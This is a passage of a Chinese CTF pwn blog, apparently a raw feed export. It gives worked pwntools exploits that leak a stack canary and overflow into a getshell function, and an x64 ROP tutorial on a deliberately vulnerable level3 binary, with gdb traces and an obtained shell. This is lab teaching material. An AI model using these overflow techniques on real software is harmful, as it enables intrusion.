variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffffcfa0 <span class="token punctuation">(</span><span class="token string">"ABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffffcfa4 <span class="token punctuation">(</span><span class="token string">"<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffcfa8 <span class="token punctuation">(</span><span class="token string">"AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffcfac <span class="token punctuation">(</span><span class="token string">"A-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value0x08048684 <span class="token keyword">in</span> vuln <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ </code></pre><p>[ebp-0xc] == eax ，判断是否等于原cookie：DWORD PTR gs:0x14，我们发现要进行比较时eax的值被覆盖为AAhA，那查一下offset就知道cookie在栈中的位置了</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ pattern offset AAhAAAhA found at offset: 100gdb-peda$ </code></pre><p><strong>100刚好是buf大小。</strong></p><h3 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h3><p>我们把payload设为 ‘A’*100直接发过去看看会发生什么（开启context.log_level)：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test'</span><span class="token keyword">:</span> pid 6732<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0xe bytes:    <span class="token string">'Hello Hacker!\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x65 bytes:    <span class="token string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x6c bytes:    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│    *    00000060  41 41 41 41  0a ca d5 b5  88 87 04 08               │AAAA│····│····│    0000006c   <span class="token comment" spellcheck="true">##注意小端序问题</span></code></pre><p>我们可以看到AAA后面是0a，<strong>注意这是\n的ASCII码值，因为我们按下了空格\n</strong>。但后面跟着ca d5 b5，由上面的位置计算可知这是cookie的值，<strong>因为前面的\x00被\n覆盖所以无法阶段字符串将后面的什么鬼东西都输出来了，包括cookie的残余值。那我们就可以得到cookie了，只要减一个0xa即可。</strong><br>尝试：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>getshell <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xa</span><span class="token keyword">print</span> <span class="token string">"canary =>"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x6c bytes:    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│    *    00000060  41 41 41 41  0a f7 a3 0b  88 87 04 08               │AAAA│····│····│    0000006ccanary <span class="token operator">=</span><span class="token operator">></span>0xba3f700</code></pre><p>那接下来我们测出溢出点就可以了，我们可以插入gdb.attach(sh)在调试中测试：</p><p>测试</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>getshell <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xa</span><span class="token keyword">print</span> <span class="token string">"canary =>"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>getshell<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#p32(canary)绕过后我用100个A来查找</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>EAX: 0x0 EBX: 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>ECX: 0x64 <span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span>EDX: 0xf7f5a890 --<span class="token operator">></span> 0x0 ESI: 0xf7f59000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>ESP: 0xffb278dc <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 88 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>EIP: 0x8048696 <span class="token punctuation">(</span><span class="token operator">&lt;</span>vuln+107<span class="token operator">></span>:    ret<span class="token punctuation">)</span>EFLAGS: 0x246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x804868d <span class="token operator">&lt;</span>vuln+98<span class="token operator">></span>:    call   0x8048750 <span class="token operator">&lt;</span>__stack_chk_fail_local<span class="token operator">></span>   0x8048692 <span class="token operator">&lt;</span>vuln+103<span class="token operator">></span>:    mov    ebx,DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>   0x8048695 <span class="token operator">&lt;</span>vuln+106<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x8048696 <span class="token operator">&lt;</span>vuln+107<span class="token operator">></span>:    ret       0x8048697 <span class="token operator">&lt;</span>main<span class="token operator">></span>:    lea    ecx,<span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>   0x804869b <span class="token operator">&lt;</span>main+4<span class="token operator">></span>:    and    esp,0xfffffff0   0x804869e <span class="token operator">&lt;</span>main+7<span class="token operator">></span>:    push   DWORD PTR <span class="token punctuation">[</span>ecx-0x4<span class="token punctuation">]</span>   0x80486a1 <span class="token operator">&lt;</span>main+10<span class="token operator">></span>:    push   ebp<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffb278dc <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 88 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffb278e0 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 84 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffb278e4 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 80 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffb278e8 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 76 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffb278ec <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 72 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffb278f0 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 68 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffb278f4 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 64 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffb278f8 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 60 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value0x08048696 <span class="token keyword">in</span> vuln <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ </code></pre><p>可以看到确实绕过了canary而且在ESP提示：后面又88个A，所以多了88个。因此只要12个即可。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>getshell <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xa</span>   <span class="token comment" spellcheck="true">##不要忘了cookie是随机的</span><span class="token keyword">print</span> <span class="token string">"canary =>"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">12</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>getshell<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>[*] Switching to interactive mode[DEBUG] Received 0x64 bytes:    &#39;A&#39; * 0x64AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ whoami[DEBUG] Sent 0x7 bytes:    &#39;whoami\n&#39;[DEBUG] Received 0x7 bytes:    &#39;hunter\n&#39;hunter$  </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蒸米X64</title>
      <link href="/2020/07/10/zheng-mi-x64/"/>
      <url>/2020/07/10/zheng-mi-x64/</url>
      
        <content type="html"><![CDATA[<h2 id="1：X86-X64主要区别"><a href="#1：X86-X64主要区别" class="headerlink" title="1：X86 X64主要区别"></a>1：X86 X64主要区别</h2><ul><li>首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常</li><li>其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上</li></ul><p><strong>常见寄存器</strong></p><pre class=" language-bash"><code class="language-bash">64-bit             register Lower 32             bits Lower 16             bits Lower 8 bitsrax             eax                         ax                         alrbx             ebx                         bx                         blrcx             ecx                         cx                         clrdx             edx                         dx                         dlrsi             esi                         si                         silrdi             edi                         di                         dilrbp             ebp                         bp                         bplrsp             esp                         sp                         splr8                 r8d                         r8w                     r8br9                 r9d                         r9w                     r9br10             r10d                         r10w                     r10br11             r11d                         r11w                     r11br12             r12d                         r12w                     r12br13             r13d                         r13w                     r13br14             r14d                         r14w                     r14br15             r15d                         r15w                     r15b</code></pre><h2 id="2：例子–level3"><a href="#2：例子–level3" class="headerlink" title="2：例子–level3"></a>2：例子–level3</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">callsystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>关闭 stack ，pie </p><pre class=" language-bash"><code class="language-bash">gcc -fno-stack-protector -no-pie level3.c -o level3</code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>显然可以由vulnerable函数溢出控制跳转到callsystem函数就能执行system了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#callsystem：0x0000000000400577</span><span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000040044e</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000400577</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>知道我为啥要在跳转callsystem时加一个ret吗，因为不这样做我在本地执行会出现堆栈不能对齐的错误。</p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/rop/蒸米rop/x64$ python level3.py <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./level3'</span><span class="token keyword">:</span> pid 7213<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive modeHELLO,WORLD\x00$  </code></pre><p><strong>可以发现X64的栈溢出控制程序转跳和X86没啥区别，就是多注意堆栈不平衡</strong></p><h3 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h3><p>前面提到，x64的可用地址不能大于0x00007fffffffffff，我们用这个程序试一下’</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> <span class="token string">'AAAAAAAA'</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>在gdb直接c一直执行，结果：</p><pre class=" language-bash"><code class="language-bash">RSP: 0x7fffffffde98 <span class="token punctuation">(</span><span class="token string">"AAAAAAAA\n\337\377\377\377\177"</span><span class="token punctuation">)</span>RIP: 0x4005aa <span class="token punctuation">(</span><span class="token operator">&lt;</span>vulnerable_function+32<span class="token operator">></span>:    ret<span class="token punctuation">)</span>R8 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 R9 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 R10: 0x3 R11: 0x246 R12: 0x400490 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp<span class="token punctuation">)</span>R13: 0x7fffffffdf90 --<span class="token operator">></span> 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x10203 <span class="token punctuation">(</span>CARRY parity adjust zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x4005a3 <span class="token operator">&lt;</span>vulnerable_function+25<span class="token operator">></span>:    call   0x400480 <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>   0x4005a8 <span class="token operator">&lt;</span>vulnerable_function+30<span class="token operator">></span>:    nop   0x4005a9 <span class="token operator">&lt;</span>vulnerable_function+31<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x4005aa <span class="token operator">&lt;</span>vulnerable_function+32<span class="token operator">></span>:    ret       0x4005ab <span class="token operator">&lt;</span>main<span class="token operator">></span>:    push   rbp   0x4005ac <span class="token operator">&lt;</span>main+1<span class="token operator">></span>:    mov    rbp,rsp   0x4005af <span class="token operator">&lt;</span>main+4<span class="token operator">></span>:    sub    rsp,0x10   0x4005b3 <span class="token operator">&lt;</span>main+8<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>,edi<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0x7fffffffde98 <span class="token punctuation">(</span><span class="token string">"AAAAAAAA\n\337\377\377\377\177"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0x7fffffffdea0 --<span class="token operator">></span> 0x7fffffffdf0a --<span class="token operator">></span> 0x8541000000000000 0016<span class="token operator">|</span> 0x7fffffffdea8 --<span class="token operator">></span> 0x100000000 0024<span class="token operator">|</span> 0x7fffffffdeb0 --<span class="token operator">></span> 0x4005f0 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>:    push   r15<span class="token punctuation">)</span>0032<span class="token operator">|</span> 0x7fffffffdeb8 --<span class="token operator">></span> 0x7ffff7a05b97 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main+231<span class="token operator">></span>:    mov    edi,eax<span class="token punctuation">)</span>0040<span class="token operator">|</span> 0x7fffffffdec0 --<span class="token operator">></span> 0x1 0048<span class="token operator">|</span> 0x7fffffffdec8 --<span class="token operator">></span> 0x7fffffffdf98 --<span class="token operator">></span> 0x7fffffffe2f7 <span class="token punctuation">(</span><span class="token string">"./level3"</span><span class="token punctuation">)</span>0056<span class="token operator">|</span> 0x7fffffffded0 --<span class="token operator">></span> 0x100008000 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueStopped reason: SIGSEGV0x00000000004005aa <span class="token keyword">in</span> vulnerable_function <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ </code></pre><p>停在了vulnerable函数的ret，因为此时可以看到rsp里面是我们的AAAAAAAA即0x4141414141414141大于0x00007fffffffffff所以不会跳转，而是停在ret。那么我们把地址调小</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> <span class="token string">'ABCDEF\x00\x00'</span>  <span class="token comment" spellcheck="true">#小端序\x00\x00会存在高地址</span><span class="token comment" spellcheck="true">#payload = 'a'*136 + 'AAAAAAAA'</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-bash"><code class="language-bash">RSP: 0x7fffffffdea0 --<span class="token operator">></span> 0x7fffffffdf0a --<span class="token operator">></span> 0x1c80000000000000 RIP: 0x464544434241 <span class="token punctuation">(</span><span class="token string">'ABCDEF'</span><span class="token punctuation">)</span>R8 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 R9 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 R10: 0x3 R11: 0x246 R12: 0x400490 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp<span class="token punctuation">)</span>R13: 0x7fffffffdf90 --<span class="token operator">></span> 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x10203 <span class="token punctuation">(</span>CARRY parity adjust zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>Invalid <span class="token variable">$PC</span> address: 0x464544434241<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0x7fffffffdea0 --<span class="token operator">></span> 0x7fffffffdf0a --<span class="token operator">></span> 0x1c80000000000000 0008<span class="token operator">|</span> 0x7fffffffdea8 --<span class="token operator">></span> 0x100000000 0016<span class="token operator">|</span> 0x7fffffffdeb0 --<span class="token operator">></span> 0x4005f0 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>:    push   r15<span class="token punctuation">)</span>0024<span class="token operator">|</span> 0x7fffffffdeb8 --<span class="token operator">></span> 0x7ffff7a05b97 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main+231<span class="token operator">></span>:    mov    edi,eax<span class="token punctuation">)</span>0032<span class="token operator">|</span> 0x7fffffffdec0 --<span class="token operator">></span> 0x1 0040<span class="token operator">|</span> 0x7fffffffdec8 --<span class="token operator">></span> 0x7fffffffdf98 --<span class="token operator">></span> 0x7fffffffe2f7 <span class="token punctuation">(</span><span class="token string">"./level3"</span><span class="token punctuation">)</span>0048<span class="token operator">|</span> 0x7fffffffded0 --<span class="token operator">></span> 0x100008000 0056<span class="token operator">|</span> 0x7fffffffded8 --<span class="token operator">></span> 0x4005ab <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">></span>:    push   rbp<span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueStopped reason: SIGSEGV0x0000464544434241 <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ </code></pre><p>成功跳转到0x0000464544434241即 \x00\x00ABCDEF<br><strong>所以我们在ret地址的时候要注意这个问题可用地址不能大于0x00007fffffffffff</strong></p><h2 id="3：level4"><a href="#3：level4" class="headerlink" title="3：level4"></a>3：level4</h2><p>在leve3的基础上把后门callsystem换成一个输出system地址的函数</p><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><pre class=" language-c"><code 